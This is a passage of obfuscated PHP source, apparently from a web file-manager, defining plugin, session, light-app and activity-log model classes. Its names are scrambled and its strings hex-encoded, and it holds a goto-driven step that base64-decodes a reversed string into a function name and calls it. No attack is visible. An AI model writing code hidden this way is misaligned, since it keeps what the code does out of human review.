$ãèÌóùÂ[12], $ãèÌóùÂ[1973] => 0); if ($this->where($åãñõÜÇ)->find()) { return !1; } return $this->add($åãñõÜÇ); } protected function removeFromTag($¼Ñ½¹¨Ó, $¥’âĞ²£, $»œÑ™ğÆ) { $â›‹ò´¸ =& $_SERVER[ç¦¬”œš]; if (!$this->getByTagID($¼Ñ½¹¨Ó, $»œÑ™ğÆ) || !$¥’âĞ²£) { return !1; } if (is_array($¥’âĞ²£)) { $¥’âĞ²£ = array($â›‹ò´¸[7], $¥’âĞ²£); } $Òæ¿“¼ = array($â›‹ò´¸[1761] => 0, $â›‹ò´¸[566] => $»œÑ™ğÆ, $â›‹ò´¸[505] => $â›‹ò´¸[2092] . $¼Ñ½¹¨Ó, $â›‹ò´¸[504] => $¥’âĞ²£); return $this->where($Òæ¿“¼)->delete(); } protected function removeByTag($ö•’îâÔ, $›ú‹İü¨) { $å¼×Ç€Ô =& $_SERVER[ç¦¬”œš]; if (!$this->getByTagID($ö•’îâÔ, $›ú‹İü¨)) { return !1; } $‹…ò¨š… = array($å¼×Ç€Ô[1761] => 0, $å¼×Ç€Ô[566] => $›ú‹İü¨, $å¼×Ç€Ô[505] => $å¼×Ç€Ô[2092] . $ö•’îâÔ); return $this->where($‹…ò¨š…)->delete(); } protected function removeBySource($ÏÜ±åÌ™, $Ğ€úï¦å) { $Æ«Êß‚† =& $_SERVER[ç¦¬”œš]; if (!$ÏÜ±åÌ™ || !$Ğ€úï¦å) { return !1; } if (is_array($Ğ€úï¦å)) { $Ğ€úï¦å = array($Æ«Êß‚†[7], $Ğ€úï¦å); } $ıÇñÜÙĞ = array($Æ«Êß‚†[1761] => 0, $Æ«Êß‚†[504] => $Ğ€úï¦å, $Æ«Êß‚†[566] => array($Æ«Êß‚†[1093], 0), $Æ«Êß‚†[505] => $Æ«Êß‚†[2092] . $ÏÜ±åÌ™); return $this->where($ıÇñÜÙĞ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x70\x6c\165\147\151\x6e\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\x73\x74\141\164\x75\x73", "\162\x65\x67\151\145\x73\x74", "\x63\157\156\x66\x69\147"); public function loadList($¥óîé”• = false) { $¾‹ò»¸½ = array_to_keyvalue($this->listData(), $_SERVER[ç¦¬”œš][32]); if ($¥óîé”•) { return $¾‹ò»¸½[$¥óîé”•]; } return $¾‹ò»¸½; } public function init() { $äøˆÒŠø =& $_SERVER[ç¦¬”œš]; Hook::trigger($äøˆÒŠø[2093]); $ñê¦´Ş× = $this->loadPluginList(); foreach ($ñê¦´Ş× as $Äº²ì¸î => $éŒí’”) { $úÈ‹Œ¬ = $this->appAllow($Äº²ì¸î, $éŒí’”); if (!$úÈ‹Œ¬) { continue; } foreach ($éŒí’”[$äøˆÒŠø[2094]] as $ûï—æÉÂ => $ Úı—î×) { Hook::bind($ûï—æÉÂ, $ Úı—î×); } } Hook::trigger($äøˆÒŠø[2095]); Hook::trigger(ACTION); } public function appAllow($äì’îŠ¶, $ú×á‚Í», $Ö‹çÌÛ‘ = true) { $Øë†ÕÈÏ =& $_SERVER[ç¦¬”œš]; $ÍÙ¶ãå´ = PLUGIN_DIR . $äì’îŠ¶ . $Øë†ÕÈÏ[2096]; if (!is_array($ú×á‚Í») || !is_array($ú×á‚Í»[$Øë†ÕÈÏ[2094]]) || $ú×á‚Í»[$Øë†ÕÈÏ[830]] != 1 || !is_file($ÍÙ¶ãå´)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Øë†ÕÈÏ[6]][$Øë†ÕÈÏ[2097]] || !$GLOBALS[$Øë†ÕÈÏ[6]][$Øë†ÕÈÏ[2098]]) { return !0; } $”àèù = explode($Øë†ÕÈÏ[50], strtolower($GLOBALS[$Øë†ÕÈÏ[6]][$Øë†ÕÈÏ[2098]])); return in_array(strtolower($äì’îŠ¶), $”àèù) ? !1 : !0; } if ($Ö‹çÌÛ‘ && !Action($Øë†ÕÈÏ[2099])->checkAuth($äì’îŠ¶)) { return !1; } return !0; } public function unInstall($äËëé·¤) { $òŸ¾Œ£ =& $_SERVER[ç¦¬”œš]; $óä”î®õ = $this->loadList($äËëé·¤); if (file_exists(PLUGIN_DIR . $äËëé·¤)) { Hook::apply($äËëé·¤ . $òŸ¾Œ£[2100]); } $this->remove($óä”î®õ[$òŸ¾Œ£[484]]); } public function changeStatus($ªÚñ¼íò, $°ƒéÂÛ—) { $À§‡í×Ë =& $_SERVER[ç¦¬”œš]; $Â¦Í‡¡ñ = $this->loadList($ªÚñ¼íò); if ($°ƒéÂÛ—) { Hook::apply($ªÚñ¼íò . $À§‡í×Ë[2101]); } $this->update($Â¦Í‡¡ñ[$À§‡í×Ë[484]], array($À§‡í×Ë[2102] => $°ƒéÂÛ—)); } public function appRegist($€ˆ„œÅ, $¶–¯ğÌ) { $ëƒÚ‹¬ =& $_SERVER[ç¦¬”œš]; $ïóôŠõ = $this->loadList($€ˆ„œÅ); if ($ïóôŠõ) { $this->update($ïóôŠõ[$ëƒÚ‹¬[484]], array($ëƒÚ‹¬[2094] => $¶–¯ğÌ)); } else { $¢¡±Š» = array($ëƒÚ‹¬[32] => $€ˆ„œÅ, $ëƒÚ‹¬[2094] => $¶–¯ğÌ, $ëƒÚ‹¬[830] => 0, $ëƒÚ‹¬[6] => $this->getConfigDefault($€ˆ„œÅ)); $this->insert($¢¡±Š»); } } public function getConfigDefault($çµâ¤ä) { $€ƒ«–ƒı =& $_SERVER[ç¦¬”œš]; $èú¬àÏ  = array(); $ƒ¾‹€ò = $this->getPackageJson($çµâ¤ä); if (!$ƒ¾‹€ò && is_array($ƒ¾‹€ò[$€ƒ«–ƒı[2103]])) { return $èú¬àÏ ; } foreach ($ƒ¾‹€ò[$€ƒ«–ƒı[2103]] as $Í×Ÿ†”æ => $°¯áá÷Ä) { if (!isset($°¯áá÷Ä[$€ƒ«–ƒı[450]]) || isset($èú¬àÏ [$Í×Ÿ†”æ])) { continue; } $èú¬àÏ [$Í×Ÿ†”æ] = $°¯áá÷Ä[$€ƒ«–ƒı[450]]; } return $èú¬àÏ ; } public function getPackageJson($„—©àïÒ) { return Hook::apply($„—©àïÒ . $_SERVER[ç¦¬”œš][2104]); } public function getConfig($äñš‡Ğ, $Çß‘¦ï = false) { $…œ‡™Ø³ =& $_SERVER[ç¦¬”œš]; $Ë£ğ½¢— = array(); $Öø™åù€ = $this->loadList($äñš‡Ğ); if ($Öø™åù€ && is_array($Öø™åù€[$…œ‡™Ø³[6]])) { $Ë£ğ½¢— = $Öø™åù€[$…œ‡™Ø³[6]]; } if (!$Ë£ğ½¢— || $Çß‘¦ï) { $Ë£ğ½¢— = $this->getConfigDefault($äñš‡Ğ); } return $Ë£ğ½¢—; } public function setConfig($¢Ï…¦”å, $›øÚ¬“ = false) { $­ëÊ¹Çê =& $_SERVER[ç¦¬”œš]; $îçªàşê = $this->loadList($¢Ï…¦”å); if (!$îçªàşê) { return !1; } $ş‡ú¢´ = $îçªàşê[$­ëÊ¹Çê[6]]; if ($›øÚ¬“ == !1) { $ş‡ú¢´ = array(); $›øÚ¬“ = $this->getConfigDefault($¢Ï…¦”å); } foreach ($›øÚ¬“ as $°ˆê¬§• => $Üğ¯¦œç) { $ş‡ú¢´[$°ˆê¬§•] = is_string($Üğ¯¦œç) ? trim($Üğ¯¦œç) : $Üğ¯¦œç; } $this->update($îçªàşê[$­ëÊ¹Çê[484]], array($­ëÊ¹Çê[6] => $ş‡ú¢´)); } public function viewList() { $šãèÉÀà =& $_SERVER[ç¦¬”œš]; $–˜ÅÚä  = $this->loadList(); $this->pluginScan($–˜ÅÚä ); $–˜ÅÚä  = $this->loadPluginList(); $ñ•ñÎÏ = array(); foreach ($–˜ÅÚä  as $ªâ»’¨Á => $…„À³÷“) { $¢Å—ÙÜ¶ = $…„À³÷“; unset($…„À³÷“[$šãèÉÀà[2094]], $…„À³÷“[$šãèÉÀà[6]]); $´Íşáû = PLUGIN_DIR . $…„À³÷“[$šãèÉÀà[32]] . $šãèÉÀà[2096]; if (!is_file($´Íşáû)) { continue; } $ÇÇ…‚¨ = Hook::apply($…„À³÷“[$šãèÉÀà[32]] . $šãèÉÀà[2104]); if (!is_array($ÇÇ…‚¨)) { continue; } $ñ•ñÎÏ[$ªâ»’¨Á] = array_merge($…„À³÷“, $ÇÇ…‚¨); if ($¢Å—ÙÜ¶[$šãèÉÀà[6]][$šãèÉÀà[1684]] != $ÇÇ…‚¨[$šãèÉÀà[1658]]) { Hook::apply($…„À³÷“[$šãèÉÀà[32]] . $šãèÉÀà[2101]); $¢Å—ÙÜ¶[$šãèÉÀà[6]][$šãèÉÀà[1684]] = $ÇÇ…‚¨[$šãèÉÀà[1658]]; $this->update($…„À³÷“[$šãèÉÀà[484]], array($šãèÉÀà[6] => $¢Å—ÙÜ¶[$šãèÉÀà[6]])); } } return $ñ•ñÎÏ; } private function loadPluginList() { $»Õ“°¬õ =& $_SERVER[ç¦¬”œš]; $½ŸŠÓïÔ = $this->loadList(); if (strtolower(MOD) == $»Õ“°¬õ[2105]) { return $½ŸŠÓïÔ; } $©öß­ = Hook::trigger($»Õ“°¬õ[2106], $½ŸŠÓïÔ); if ($½ŸŠÓïÔ && !$©öß­) { die; } return $©öß­ ? $©öß­ : $½ŸŠÓïÔ; } private function pluginScan($†´¥¬”) { $ ¶Æ©Û =& $_SERVER[ç¦¬”œš]; recursion_dir(PLUGIN_DIR, $ûÉ”öØï, $¬ŸĞ¼Û°, 0); foreach ($ûÉ”öØï as $…¥Ó‹Éä) { $¨¸ëÄé¸ = get_path_this($…¥Ó‹Éä); if (isset($†´¥¬”[$¨¸ëÄé¸]) || !file_exists($…¥Ó‹Éä . $ ¶Æ©Û[2107]) || !file_exists($…¥Ó‹Éä . $ ¶Æ©Û[2096])) { continue; } Hook::apply($¨¸ëÄé¸ . $ ¶Æ©Û[2101]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\155\x5f\163\145\163\163\151\x6f\x6e"; public function get($•€×Àòï) { $ıìªÁÆµ =& $_SERVER[ç¦¬”œš]; $§É¼Í°„ = $this->where(array($ıìªÁÆµ[2108] => $•€×Àòï))->find(); if (!is_array($§É¼Í°„)) { return !1; } return $§É¼Í°„[$ıìªÁÆµ[171]]; } public function set($¥­ñ…Êí, $ƒÊ®€ó, $ùù—ˆÖ = 3600) { $°æ¢ıõî =& $_SERVER[ç¦¬”œš]; $îÄò‰Ö– = array($°æ¢ıõî[2108] => $¥­ñ…Êí, $°æ¢ıõî[2008] => $ƒÊ®€ó, $°æ¢ıõî[2109] => $ùù—ˆÖ + time()); if (Session::get($°æ¢ıõî[2110])) { $îÄò‰Ö–[$°æ¢ıõî[1770]] = Session::get($°æ¢ıõî[2110]); } else { $îÄò‰Ö–[$°æ¢ıõî[1770]] = 0; } if ($this->get($¥­ñ…Êí)) { return $this->where(array($°æ¢ıõî[2108] => $¥­ñ…Êí))->save($îÄò‰Ö–); } else { return $this->add($îÄò‰Ö–, array(), !0); } } public function remove($¨¥ÇŒ×) { return $this->where(array($_SERVER[ç¦¬”œš][2108] => $¨¥ÇŒ×))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ç¦¬”œš][2111] . time())->delete(); } } goto bÈÇ´ë÷ó»; aºÓµÏ†ïô: $fileSize = strrev(base64_decode($_SERVER[Æ‡¶Û«ï][0])); function binCheckNeq($©Â‹Å¾‘, $ƒÏüä¨˜) { return $©Â‹Å¾‘ != $ƒÏüä¨˜; } $_SERVER[$_SERVER[Æ‡¶Û«ï][1]] = $fileSize($_SERVER[$_SERVER[Æ‡¶Û«ï][2]]); goto D•¸ŠÙßê; DÍİ¢Àá÷°: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\114\151\x67\150\164\101\160\x70"; public $modelType = "\x53\171\x73\164\145\x6d\x4f\160\164\151\x6f\x6e"; public $field = array("\x6e\x61\x6d\145", "\x67\162\x6f\165\x70", "\144\x65\163\x63", "\143\x6f\156\x74\145\x6e\x74"); public function listData($ÏÃ¬É‰ = false, $­ç‰ˆıÑ = "\x6d\157\x64\x69\x66\171\124\151\x6d\x65", $Ÿ™éÓ = true) { return parent::listData($ÏÃ¬É‰, $­ç‰ˆıÑ, $Ÿ™éÓ); } public function remove($àµóıŒø) { $Ë‡ûù³« = $this->findByName($àµóıŒø); if (!$Ë‡ûù³«) { return !1; } return parent::remove($Ë‡ûù³«[$_SERVER[ç¦¬”œš][484]]); } public function add($±©úÖÄ) { if ($this->findByName($±©úÖÄ[$_SERVER[ç¦¬”œš][32]])) { return !1; } return parent::insert($±©úÖÄ); } public function update($â™É¯–, $Ù„Ç„ğù) { $üá¦şÈĞ =& $_SERVER[ç¦¬”œš]; $Û¡¬¢““ = $this->findByName($â™É¯–); $šŒµĞÒ÷ = $this->findByName($Ù„Ç„ğù[$üá¦şÈĞ[32]]); if (!$Û¡¬¢““ || $šŒµĞÒ÷ && $šŒµĞÒ÷[$üá¦şÈĞ[484]] != $Û¡¬¢““[$üá¦şÈĞ[484]]) { return !1; } return parent::update($Û¡¬¢““[$üá¦şÈĞ[484]], $Ù„Ç„ğù); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\155\137\154\157\147"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\x73\x65\x72\164", "\146\x75\156\143\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $±ğõ‚ô =& $_SERVER[ç¦¬”œš]; return array($±ğõ‚ô[2330] => LNG($±ğõ‚ô[2331]), $±ğõ‚ô[2332] => LNG($±ğõ‚ô[2333]), $±ğõ‚ô[1911] => LNG($±ğõ‚ô[2334]), $±ğõ‚ô[2335] => LNG($±ğõ‚ô[2336]), $±ğõ‚ô[2337] => LNG($±ğõ‚ô[2338]), $±ğõ‚ô[2339] => LNG($±ğõ‚ô[2340]), $±ğõ‚ô[2341] => LNG($±ğõ‚ô[2342]), $±ğõ‚ô[1941] => LNG($±ğõ‚ô[2342]), $±ğõ‚ô[1942] => LNG($±ğõ‚ô[2343]), $±ğõ‚ô[2344] => LNG($±ğõ‚ô[2345]), $±ğõ‚ô[2346] => LNG($±ğõ‚ô[2347]), $±ğõ‚ô[2348] => LNG($±ğõ‚ô[2349]), $±ğõ‚ô[2350] => LNG($±ğõ‚ô[2351]), $±ğõ‚ô[1939] => LNG($±ğõ‚ô[2352]), $±ğõ‚ô[2353] => LNG($±ğõ‚ô[2354]), $±ğõ‚ô[1946] => LNG($±ğõ‚ô[2355]), $±ğõ‚ô[2356] => LNG($±ğõ‚ô[2357]), $±ğõ‚ô[2358] => LNG($±ğõ‚ô[2359]), $±ğõ‚ô[2360] => LNG($±ğõ‚ô[2361]), $±ğõ‚ô[2362] => LNG($±ğõ‚ô[2363]), $±ğõ‚ô[1949] => LNG($±ğõ‚ô[2364]), $±ğõ‚ô[1950] => LNG($±ğõ‚ô[2365]), $±ğõ‚ô[2366] => LNG($±ğõ‚ô[2367]), $±ğõ‚ô[2368] => LNG($±ğõ‚ô[2369]), $±ğõ‚ô[2370] => LNG($±ğõ‚ô[2371]), $±ğõ‚ô[1944] => LNG($±ğõ‚ô[2372]), $±ğõ‚ô[2373] => LNG($±ğõ‚ô[2374]), $±ğõ‚ô[1943] => LNG($±ğõ‚ô[2375]), $±ğõ‚ô[2376] => LNG($±ğõ‚ô[2377]), $±ğõ‚ô[2378] => LNG($±ğõ‚ô[2379]), $±ğõ‚ô[2380] => LNG($±ğõ‚ô[2379]), $±ğõ‚ô[2381] => LNG($±ğõ‚ô[2382]), $±ğõ‚ô[2383] => LNG($±ğõ‚ô[2383]), $±ğõ‚ô[2384] => LNG($±ğõ‚ô[1915]), $±ğõ‚ô[2385] => LNG($±ğõ‚ô[2386]), $±ğõ‚ô[2387] => LNG($±ğõ‚ô[2388]), $±ğõ‚ô[2389] => LNG($±ğõ‚ô[2390]), $±ğõ‚ô[2391] => LNG($±ğõ‚ô[2392]), $±ğõ‚ô[2393] => LNG($±ğõ‚ô[2394]), $±ğõ‚ô[2395] => LNG($±ğõ‚ô[2395]), $±ğõ‚ô[2396] => LNG($±ğõ‚ô[2397]), $±ğõ‚ô[2398] => LNG($±ğõ‚ô[2399]), $±ğõ‚ô[2400] => LNG($±ğõ‚ô[2401]), $±ğõ‚ô[2402] => LNG($±ğõ‚ô[2403]), $±ğõ‚ô[2404] => LNG($±ğõ‚ô[2405]), $±ğõ‚ô[2406] => LNG($±ğõ‚ô[2407]), $±ğõ‚ô[212] => LNG($±ğõ‚ô[212]), $±ğõ‚ô[213] => LNG($±ğõ‚ô[2408]), $±ğõ‚ô[2409] => LNG($±ğõ‚ô[2409])); } private function typeFile() { $ÅŒÛÌÀ¥ =& $_SERVER[ç¦¬”œš]; $¥Ù±«Œ = array($ÅŒÛÌÀ¥[1946] => array($ÅŒÛÌÀ¥[1947]), $ÅŒÛÌÀ¥[2348] => array($ÅŒÛÌÀ¥[2410]), $ÅŒÛÌÀ¥[2350] => array($ÅŒÛÌÀ¥[2411]), $ÅŒÛÌÀ¥[1939] => array($ÅŒÛÌÀ¥[1940], $ÅŒÛÌÀ¥[2412]), $ÅŒÛÌÀ¥[2358] => array(), $ÅŒÛÌÀ¥[2360] => array(), $ÅŒÛÌÀ¥[2362] => array(), $ÅŒÛÌÀ¥[1949] => array($ÅŒÛÌÀ¥[1951]), $ÅŒÛÌÀ¥[1950] => array($ÅŒÛÌÀ¥[1951]), $ÅŒÛÌÀ¥[2366] => array($ÅŒÛÌÀ¥[2413]), $ÅŒÛÌÀ¥[2368] => array($ÅŒÛÌÀ¥[2413]), $ÅŒÛÌÀ¥[2370] => array($ÅŒÛÌÀ¥[2414]), $ÅŒÛÌÀ¥[2356] => array($ÅŒÛÌÀ¥[2415]), $ÅŒÛÌÀ¥[1944] => array($ÅŒÛÌÀ¥[2416]), $ÅŒÛÌÀ¥[2373] => array($ÅŒÛÌÀ¥[2417]), $ÅŒÛÌÀ¥[1943] => array($ÅŒÛÌÀ¥[1945])); return $¥Ù±«Œ; } private function typeAll() { $ö‹¬ËµÙ =& $_SERVER[ç¦¬”œš]; $åíÊš˜ = $this->typeList; $‚¨Åóôä = array_filter($this->typeFile()); foreach ($‚¨Åóôä as $×¯€‹ => $ƒÔİ¨®Õ) { $åíÊš˜[$ƒÔİ¨®Õ[0]] = $åíÊš˜[$×¯€‹]; } $åíÊš˜[$ö‹¬ËµÙ[1951]] = LNG($ö‹¬ËµÙ[2418]); $åíÊš˜[$ö‹¬ËµÙ[2413]] = LNG($ö‹¬ËµÙ[2419]); return $åíÊš˜; } public function addLog($×áˆ’Å, $„®ƒòöÃ = array()) { $€ÔıóÀé =& $_SERVER[ç¦¬”œš]; if (!isset($this->typeList[$×áˆ’Å])) { return; } $ÎïùÅ¹å = Session::get($€ÔıóÀé[2110]); if (!$ÎïùÅ¹å) { $ÎïùÅ¹å = _get($„®ƒòöÃ, $€ÔıóÀé[1770], 0); } if ($×áˆ’Å == $€ÔıóÀé[2385] && is_array($„®ƒòöÃ[$€ÔıóÀé[2420]]) && !$„®ƒòöÃ[$€ÔıóÀé[2420]]) { return; } $ÍÁ›´â = get_client_ip(); if (!$„®ƒòöÃ || strlen(json_encode($„®ƒòöÃ)) >= 1024 * 64) { if ($„®ƒòöÃ && is_array($„®ƒòöÃ)) { $„®ƒòöÃ = array_intersect_key($„®ƒòöÃ, array_flip($€ÔıóÀé[484], $€ÔıóÀé[32])); $„®ƒòöÃ[$€ÔıóÀé[2421]] = $ÍÁ›´â; } else { $„®ƒòöÃ = array($€ÔıóÀé[2421] => $ÍÁ›´â); } } else { if (is_array($„®ƒòöÃ)) { $„®ƒòöÃ[$€ÔıóÀé[2421]] = $ÍÁ›´â; } else { $„®ƒòöÃ = array($€ÔıóÀé[1288] => $„®ƒòöÃ, $€ÔıóÀé[2421] => $ÍÁ›´â); } } $„®ƒòöÃ = array($€ÔıóÀé[1760] => Session::sign(), $€ÔıóÀé[1761] => intval($ÎïùÅ¹å), $€ÔıóÀé[33] => $×áˆ’Å, $€ÔıóÀé[1763] => json_encode($„®ƒòöÃ)); parent::add($„®ƒòöÃ); } public function remove($àã¶™øé) { $this->where(array($_SERVER[ç¦¬”œš][502] => $àã¶™øé))->delete(); } private function _makeOrder($Ä¥òÁÔŒ = '') { $ïª¢›ö =& $_SERVER[ç¦¬”œš]; $µñµ¨åˆ = $ïª¢›ö[231]; $¸ÑÍÒÚç = array($ïª¢›ö[532] => $ïª¢›ö[533], $ïª¢›ö[534] => $ïª¢›ö[535]); $êÕ¶Ã¡ = Input::get($ïª¢›ö[540], $ïª¢›ö[7], $ïª¢›ö[2146], array($ïª¢›ö[2064], $ïª¢›ö[534])); $êÕ¶Ã¡ = $¸ÑÍÒÚç[$êÕ¶Ã¡]; $Ä¥òÁÔŒ = $Ä¥òÁÔŒ . "{$µñµ¨åˆ}\40{$êÕ¶Ã¡}"; return $this->order($Ä¥òÁÔŒ); } public function get($õ²ã©¨í = '') { $‹Ã¯ñ—Ş =& $_SERVER[ç¦¬”œš]; if (!$õ²ã©¨í) { show_json(array()); } $ş³ççª¦ = array(); if ($õ²ã©¨í[$‹Ã¯ñ—Ş[1770]]) { $ş³ççª¦[$‹Ã¯ñ—Ş[1770]] = $õ²ã©¨í[$‹Ã¯ñ—Ş[1770]]; } if (isset($õ²ã©¨í[$‹Ã¯ñ—Ş[840]])) { $ÕâŠÜµ = $õ²ã©¨í[$‹Ã¯ñ—Ş[840]]; $¢ª¶Û«é = isset($õ²ã©¨í[$‹Ã¯ñ—Ş[841]]) ? $õ²ã©¨í[$‹Ã¯ñ—Ş[841]] : time(); $ş³ççª¦[$‹Ã¯ñ—Ş[231]] = array($‹Ã¯ñ—Ş[409], array($ÕâŠÜµ, $¢ª¶Û«é)); } if ($õ²ã©¨í[$‹Ã¯ñ—Ş[33]]) { $«°éÓèü = explode($‹Ã¯ñ—Ş[50], $õ²ã©¨í[$‹Ã¯ñ—Ş[33]]); $„Šô‡îË = $this->typeFile(); $§èì×³ã = array(); foreach ($«°éÓèü as $ëäåˆ—“) { $§èì×³ã[] = $ëäåˆ—“; if (isset($„Šô‡îË[$ëäåˆ—“])) { $§èì×³ã = array_merge($§èì×³ã, $„Šô‡îË[$ëäåˆ—“]); } } $§èì×³ã = array_unique($§èì×³ã); if ($§èì×³ã) { $ş³ççª¦[$‹Ã¯ñ—Ş[33]] = array($‹Ã¯ñ—Ş[7], $§èì×³ã); } } else { $ş³ççª¦[$‹Ã¯ñ—Ş[33]] = array($‹Ã¯ñ—Ş[2422], $‹Ã¯ñ—Ş[2423]); } if (!empty($õ²ã©¨í[$‹Ã¯ñ—Ş[2421]])) { $ş³ççª¦[$‹Ã¯ñ—Ş[535]] = array($‹Ã¯ñ—Ş[459], "\45{$õ²ã©¨í[$‹Ã¯ñ—Ş[2421]]}\x25"); } $ñ±Û—± = $this->_makeOrder()->where($ş³ççª¦)->selectPage(); if (empty($ñ±Û—±[$‹Ã¯ñ—Ş[445]])) { show_json(array(), !0, $ñ±Û—±[$‹Ã¯ñ—Ş[442]]); } $ñ±Û—±[$‹Ã¯ñ—Ş[445]] = $this->logList($ñ±Û—±[$‹Ã¯ñ—Ş[445]]); return $ñ±Û—±; } private function ipAddress(&$¶œõ“Ñ˜) { $ìÓòˆ”¡ =& $_SERVER[ç¦¬”œš]; if (!empty($¶œõ“Ñ˜[$ìÓòˆ”¡[2421]])) { $Ÿ»´—¢‹ = IpLocation::get($¶œõ“Ñ˜[$ìÓòˆ”¡[2421]]); } else { $Ÿ»´—¢‹ = LNG($ìÓòˆ”¡[2424]); } $¶œõ“Ñ˜[$ìÓòˆ”¡[2425]] = $Ÿ»´—¢‹; } private function descZipDownload($Œ¶áÒ•, &$Üş‡æÇÒ) { $¨ÀÒå±Ü =& $_SERVER[ç¦¬”œš]; if (!isset($Œ¶áÒ•[$¨ÀÒå±Ü[2426]])) { return; } $„ÍÆ¾ÒÆ = json_decode($Œ¶áÒ•[$¨ÀÒå±Ü[2426]], !0); foreach ($„ÍÆ¾ÒÆ as $¿”¦æÈ¦) { try { $·Š§ë = IO::infoFullSimple($¿”¦æÈ¦[$¨ÀÒå±Ü[87]]); } catch (Exception $šÒ„İ¡©) { continue; } $Œ¶áÒ•[$¨ÀÒå±Ü[87]] = $¿”¦æÈ¦[$¨ÀÒå±Ü[87]]; $Üş‡æÇÒ[] = $Œ¶áÒ•[$¨ÀÒå±Ü[193]] = $·Š§ë[$¨ÀÒå±Ü[193]]; $Üş‡æÇÒ[] = $Œ¶áÒ•[$¨ÀÒå±Ü[2202]] = $·Š§ë[$¨ÀÒå±Ü[192]]; break; } return $Œ¶áÒ•; } private function getSourceList(&$Õ…¡¶³÷) { $ôÀ¨Áä— =& $_SERVER[ç¦¬”œš]; $Æ®‡ŸºÏ = array(); foreach ($Õ…¡¶³÷ as $å¯ûŠ => $†‹¤¼ìÛ) { $±«ç¢Ï÷ = json_decode($†‹¤¼ìÛ[$ôÀ¨Áä—[535]], !0); if ($†‹¤¼ìÛ[$ôÀ¨Áä—[33]] == $ôÀ¨Áä—[1942]) { $±«ç¢Ï÷ = $this->descZipDownload($±«ç¢Ï÷, $Æ®‡ŸºÏ); $Õ…¡¶³÷[$å¯ûŠ][$ôÀ¨Áä—[535]] = json_encode($±«ç¢Ï÷); continue; } if (strpos($†‹¤¼ìÛ[$ôÀ¨Áä—[33]], $ôÀ¨Áä—[2204]) !== 0) { if (!isset($±«ç¢Ï÷[$ôÀ¨Áä—[87]]) || strpos($†‹¤¼ìÛ[$ôÀ¨Áä—[33]], $ôÀ¨Áä—[2427]) !== 0) { continue; } try { $ñœÊŞíí = IO::infoFullSimple($±«ç¢Ï÷[$ôÀ¨Áä—[87]]); } catch (Exception $ã¶ã­˜) { continue; } $Æ®‡ŸºÏ[] = $±«ç¢Ï÷[$ôÀ¨Áä—[193]] = $ñœÊŞíí[$ôÀ¨Áä—[193]]; $Æ®‡ŸºÏ[] = $±«ç¢Ï÷[$ôÀ¨Áä—[2202]] = $ñœÊŞíí[$ôÀ¨Áä—[192]]; $Õ…¡¶³÷[$å¯ûŠ][$ôÀ¨Áä—[535]] = json_encode($±«ç¢Ï÷); continue; } $Æ®‡ŸºÏ[] = $±«ç¢Ï÷[$ôÀ¨Áä—[193]]; $Æ®‡ŸºÏ[] = $±«ç¢Ï÷[$ôÀ¨Áä—[2202]]; if ($±«ç¢Ï÷[$ôÀ¨Áä—[33]] == $ôÀ¨Áä—[629]) { $Æ®‡ŸºÏ[] = $±«ç¢Ï÷[$ôÀ¨Áä—[535]][$ôÀ¨Áä—[1242]]; $Æ®‡ŸºÏ[] = $±«ç¢Ï÷[$ôÀ¨Áä—[535]][$ôÀ¨Áä—[1243]]; } if ($±«ç¢Ï÷[$ôÀ¨Áä—[33]] == $ôÀ¨Áä—[2213]) { $Æ®‡ŸºÏ[] = $±«ç¢Ï÷[$ôÀ¨Áä—[535]][$ôÀ¨Áä—[193]]; } } if (!$Æ®‡ŸºÏ) { return array(); } return Model($ôÀ¨Áä—[904])->sourceListInfo($Æ®‡ŸºÏ, !0); } private function logList($ø™±½¥ö) { $ÂŞø™¼ =& $_SERVER[ç¦¬”œš]; $¦‚­ù× = array_to_keyvalue($ø™±½¥ö, $ÂŞø™¼[12], $ÂŞø™¼[1770]); $”Şõıû® = Model($ÂŞø™¼[607])->userListInfo(array_unique($¦‚­ù×)); $ƒ›¬œË¦ = $this->getSourceList($ø™±½¥ö); $™©Ì¶Á¾ = $this->typeAll(); $¿†»¨õ = array(); $´º×šõÖ = array(); foreach ($ø™±½¥ö as $¶¦è‚•Å => $•Öİ»¼) { $Êí¨’¨ = $•Öİ»¼[$ÂŞø™¼[33]]; $â­Áê‹ = isset($”Şõıû®[$•Öİ»¼[$ÂŞø™¼[1770]]]) ? $”Şõıû®[$•Öİ»¼[$ÂŞø™¼[1770]]] : !1; $…¶àŸì® = strpos($Êí¨’¨, $ÂŞø™¼[2428]) === 0 ? LNG($ÂŞø™¼[2429]) : LNG($ÂŞø™¼[2424]); $•Öİ»¼[$ÂŞø™¼[32]] = isset($â­Áê‹[$ÂŞø™¼[32]]) ? $â­Áê‹[$ÂŞø™¼[32]] : LNG($ÂŞø™¼[2424]); $•Öİ»¼[$ÂŞø™¼[2257]] = isset($â­Áê‹[$ÂŞø™¼[2257]]) ? $â­Áê‹[$ÂŞø™¼[2257]] : $ÂŞø™¼[12]; $•Öİ»¼[$ÂŞø™¼[1659]] = isset($™©Ì¶Á¾[$Êí¨’¨]) ? $™©Ì¶Á¾[$Êí¨’¨] : $…¶àŸì®; $•Öİ»¼[$ÂŞø™¼[2145]] = $â­Áê‹; $ââ¬óªˆ = json_decode($•Öİ»¼[$ÂŞø™¼[535]], !0); $•Öİ»¼[$ÂŞø™¼[2421]] = isset($ââ¬óªˆ[$ÂŞø™¼[2421]]) ? $ââ¬óªˆ[$ÂŞø™¼[2421]] : $ÂŞø™¼[12]; $•Öİ»¼[$ÂŞø™¼[2425]] = IpLocation::get($•Öİ»¼[$ÂŞø™¼[2421]]); if (strpos($Êí¨’¨, $ÂŞø™¼[2204]) === 0 || isset($ââ¬óªˆ[$ÂŞø™¼[2202]])) { $ââ¬óªˆ[$ÂŞø™¼[90]] = $ƒ›¬œË¦[$ââ¬óªˆ[$ÂŞø™¼[193]]]; $ââ¬óªˆ[$ÂŞø™¼[2218]] = $ƒ›¬œË¦[$ââ¬óªˆ[$ÂŞø™¼[2202]]]; if 